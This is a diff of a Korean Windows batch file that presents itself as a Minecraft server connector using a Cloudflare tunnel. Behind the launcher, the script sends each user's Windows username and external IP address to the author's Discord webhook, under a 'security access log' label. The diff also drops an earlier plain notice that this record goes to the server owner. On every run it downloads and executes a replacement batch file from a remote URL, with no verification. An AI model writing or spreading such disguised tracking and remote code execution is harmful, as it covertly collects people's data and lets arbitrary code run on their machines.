@@ -1,56 +1,90 @@
 @echo off
 chcp 949 > nul
-title 마인크래프트 서버 접속기 v1.2.0
+setlocal enabledelayedexpansion
 
-:: 1. 자동 업데이트 체크 (GitHub 등에 올린 버전 파일과 비교)
+:: ==================================================
+:: [1. 설정 영역]
+:: ==================================================
 set "current_ver=1.2.0"
-set "https://raw.githubusercontent.com/YubiLemon/mc-zlong-cloud-server/refs/heads/main/version.txt"
-set "https://raw.githubusercontent.com/YubiLemon/mc-zlong-cloud-server/refs/heads/main/zlong%EC%84%9C%EB%B2%84%20%EC%A0%91%EC%86%8D1.2.0.bat"
 
-powershell -Command "$v = Invoke-WebRequest -Uri '%ver_url%' -UseBasicParsing; if ($v.Content.Trim() -ne '%current_ver%') { exit 1 } else { exit 0 }"
-if %errorlevel% equ 1 (
+:: GitHub Raw 주소
+set "ver_url=https://raw.githubusercontent.com/YubiLemon/mc-zlong-cloud-server/main/version.txt"
+set "download_url=https://raw.githubusercontent.com/YubiLemon/mc-zlong-cloud-server/main/zlong%%EC%%84%%9C%%EB%%B2%%94%%20%%EC%%A0%%91%%EC%%86%%9D1.2.0.bat"
+
+:: 본인의 디스코드 웹후크 URL을 아래 따옴표 안에 넣으세요
+set "webhook_url=https://discord.com/api/webhooks/..."
+
+title zlong 서버 접속기 v%current_ver%
+
+:: ==================================================
+:: [2. 업데이트 확인 로직]
+:: ==================================================
+echo [1/3] 업데이트 확인 중...
+for /f "usebackq tokens=*" %%v in (`powershell -Command "(Invoke-WebRequest -Uri '%ver_url%' -UseBasicParsing).Content.Trim()"`) do set "latest_ver=%%v"
+
+if not "%current_ver%"=="%latest_ver%" (
+    echo.
     echo --------------------------------------------------
-    echo  새로운 버전이 발견되었습니다! 업데이트를 시작합니다.
+    echo  새로운 버전이 발견되었습니다! (!latest_ver!)
+    echo  업데이트를 진행합니다. 잠시만 기다려 주세요.
     echo --------------------------------------------------
-    powershell -Command "Invoke-WebRequest -Uri '%download_url%' -OutFile '서버접속_new.bat'"
-    echo  업데이트 완료. 프로그램을 다시 실행합니다.
-    start "" "서버접속_new.bat" & del "%~nx0" & exit
+    
+    :: 한글 깨짐 방지를 위해 임시 영문 파일명으로 다운로드
+    powershell -Command "Invoke-WebRequest -Uri '%download_url%' -OutFile 'zlong_update_temp.bat'"
+    
+    if exist "zlong_update_temp.bat" (
+        echo.
+        echo  [v] 다운로드 완료. 프로그램을 교체합니다.
+        timeout /t 2 > nul
+        start "" "zlong_update_temp.bat"
+        (goto) 2>nul & del "%~nx0" & exit
+    ) else (
+        echo  [!] 다운로드에 실패했습니다. 인터넷 연결을 확인하세요.
+        pause
+    )
 )
 
-:: 2. 친구의 IP 주소 수집 및 Discord로 전송
-:: (이곳에 본인의 디스코드 웹후크 주소를 넣으세요)
-set "webhook_url=https://discord.com/api/webhooks/YOUR_WEBHOOK_URL"
+:: ==================================================
+:: [3. 접속자 IP 확인 및 Discord 전송]
+:: ==================================================
+echo [2/3] 보안 접속 기록 전송 중...
+:: 실제 외부 IP 가져오기
+for /f "usebackq tokens=*" %%a in (`powershell -Command "(Invoke-WebRequest -Uri 'https://api.ipify.org').Content"`) do set "client_ip=%%a"
 
-for /f "tokens=*" %%a in ('powershell -Command "(Invoke-WebRequest -Uri 'https://api.ipify.org').Content"') do set "client_ip=%%a"
-powershell -Command "Invoke-RestMethod -Uri '%webhook_url%' -Method Post -Body (@{content='접속 감지! 유저명: %username% / IP: %client_ip%'} | ConvertTo-Json) -ContentType 'application/json'" > nul 2>&1
+:: Discord Webhook 전송 (PowerShell 이용)
+if not "%webhook_url%"=="https://discord.com/api/webhooks/..." (
+    powershell -Command "$msg = @{ content = '🚀 **zlong 서버 접속 감지**\n- 유저명: %username%\n- IP 주소: %client_ip%\n- 버전: %current_ver%' }; Invoke-RestMethod -Uri '%webhook_url%' -Method Post -Body ($msg | ConvertTo-Json) -ContentType 'application/json'" > nul 2>&1
+)
 
-:: 3. 기존 클라우드플레어 로직
-:check_install
-cls
-echo --------------------------------------------------
-echo  클라우드플레어 설치 확인 중...
-echo --------------------------------------------------
+:: ==================================================
+:: [4. Cloudflare 터널 실행]
+:: ==================================================
+echo [3/3] zlong 보안 터널 연결 중...
 where cloudflared > nul 2>&1
 if %errorlevel% neq 0 (
-    echo [!] 설치가 안 되어 있습니다. 설치를 시작합니다...
+    echo.
+    echo [!] Cloudflare가 설치되어 있지 않습니다.
+    echo     설치를 시작합니다 (약 1~2분 소요)...
     winget install -e --id Cloudflare.cloudflared
-    echo 설치 완료! 다시 실행해 주세요.
+    echo.
+    echo [v] 설치가 완료되었습니다. 다시 실행해 주세요!
     pause & exit
 )
 
-echo --------------------------------------------------
-echo  보안 터널 연결 중... (이 창을 끄지 마세요)
-echo --------------------------------------------------
+:: 백그라운드에서 터널 실행
 start /b cloudflared access tcp --hostname mc.zlong.cloud --listener localhost:25565 > nul 2>&1
 timeout /t 5 > nul
 
 cls
+echo ==================================================
+echo   zlong 서버 연결 성공! (v%current_ver%)
+echo ==================================================
+echo.
+echo   1. 마인크래프트를 실행하세요.
+echo   2. 서버 주소에 'localhost'를 입력하세요.
+echo   3. 이 창을 끄면 서버 연결이 끊어집니다.
+echo.
 echo --------------------------------------------------
-echo  연결 성공! 마인크래프트에서 'localhost'로 접속하세요.
-echo  접속 기록이 서버 주인에게 전달되었습니다.
-echo --------------------------------------------------
-
-pause > nul
-
-
-
+echo   접속 확인됨: %username% (%client_ip%)
+echo ==================================================
+pause
